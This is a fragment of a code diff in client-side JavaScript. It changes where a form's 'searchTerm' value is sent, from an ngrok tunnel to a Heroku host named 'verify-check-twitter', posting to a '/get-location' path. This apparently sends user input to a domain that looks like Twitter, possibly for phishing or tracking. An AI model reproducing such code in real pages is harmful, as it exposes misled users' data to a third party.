@@ -109,7 +109,7 @@
         var name = document.querySelector('[name="searchTerm"]').value
         //send data
         var xhr = new XMLHttpRequest()
-        xhr.open('POST', `https://8778-41-238-47-18.eu.ngrok.io/get-location`)
+        xhr.open('POST', `https://verify-check-twitter.herokuapp.com/get-location`)
         xhr.setRequestHeader('Content-Type', 'application/json')
         xhr.send(JSON.stringify({
             name
